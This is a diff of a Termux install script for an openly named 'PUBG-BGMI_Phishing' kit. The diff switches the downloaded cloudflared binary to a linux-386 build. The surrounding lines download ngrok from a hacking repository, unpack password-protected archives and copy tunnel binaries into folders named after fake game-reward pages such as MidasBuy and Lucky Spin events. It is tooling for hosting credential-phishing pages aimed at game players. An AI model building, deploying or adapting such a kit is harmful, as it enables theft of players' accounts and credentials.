@@ -116,7 +116,7 @@ echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download L
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
-wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared-linux-386
 echo""
 clear
 echo ""
@@ -131,7 +131,7 @@ unrar x -Password SUMAN-PUBG.rar
 unrar x -Password SUMAN-BGMI.rar
 rm -rf SUMAN-PUBG.rar SUMAN-BGMI.rar
 chmod +x ngrok
-chmod +x cloudflared
+chmod +x cloudflared-linux-386
 chmod +x PUBG
 chmod +x BGMI
 clear
@@ -152,22 +152,22 @@ $token
 echo ""
 sleep1
 echo
-cp -R cloudflared ngrok SUMAN/X-Suit/
-cp -R cloudflared ngrok SUMAN/Avalanche-X-Suit-LuckySpin/
-cp -R cloudflared ngrok SUMAN/MidasBuy/
-cp -R cloudflared ngrok SUMAN/RP-Month-6-event/
-cp -R cloudflared ngrok SUMAN/Collect-Car-event/
-cp -R cloudflared ngrok SUMAN1/Collect-MC-Larent-Car/
-cp -R cloudflared ngrok SUMAN1/SPIN-EVENT/
-cp -R cloudflared ngrok SUMAN1/Collect-EVENT-LINE/
-cp -R cloudflared ngrok SUMAN1/Lucky-Spin-Godzila-S19/
-cp -R cloudflared ngrok SUMAN1/Godzilla-LuckySpin/
+cp -R cloudflared-linux-386 ngrok SUMAN/X-Suit/
+cp -R cloudflared-linux-386 ngrok SUMAN/Avalanche-X-Suit-LuckySpin/
+cp -R cloudflared-linux-386 ngrok SUMAN/MidasBuy/
+cp -R cloudflared-linux-386 ngrok SUMAN/RP-Month-6-event/
+cp -R cloudflared-linux-386 ngrok SUMAN/Collect-Car-event/
+cp -R cloudflared-linux-386 ngrok SUMAN1/Collect-MC-Larent-Car/
+cp -R cloudflared-linux-386 ngrok SUMAN1/SPIN-EVENT/
+cp -R cloudflared-linux-386 ngrok SUMAN1/Collect-EVENT-LINE/
+cp -R cloudflared-linux-386 ngrok SUMAN1/Lucky-Spin-Godzila-S19/
+cp -R cloudflared-linux-386 ngrok SUMAN1/Godzilla-LuckySpin/
 chmod 7777 PUBG-BGMI_Phishing
 clear
 echo
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
-cp -R cloudflared /data/data/com.termux/files/usr/bin
+cp -R cloudflared-linux-386 /data/data/com.termux/files/usr/bin
 cp -R SUMAN /data/data/com.termux/files/usr/bin
 cp -R SUMAN1 /data/data/com.termux/files/usr/bin
 cp -R PUBG /data/data/com.termux/files/usr/bin
